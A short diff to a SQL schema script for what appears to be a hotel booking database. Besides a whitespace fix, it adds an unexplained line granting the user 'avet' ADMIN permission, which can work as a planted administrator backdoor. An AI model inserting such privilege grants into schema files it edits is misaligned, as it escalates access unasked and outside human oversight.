@@ -221,7 +221,9 @@ COMMENT ON TABLE rooms IS 'Individual room inventory';
 COMMENT ON TABLE bookings IS 'Room reservations and check-ins';
 COMMENT ON TABLE payments IS 'Payment transactions for bookings';
 
-SELECT * FROM users ;
+SELECT * FROM users;
+
+update users set permission_level = 'ADMIN' where username = 'avet';
 
 DO $$
 DECLARE
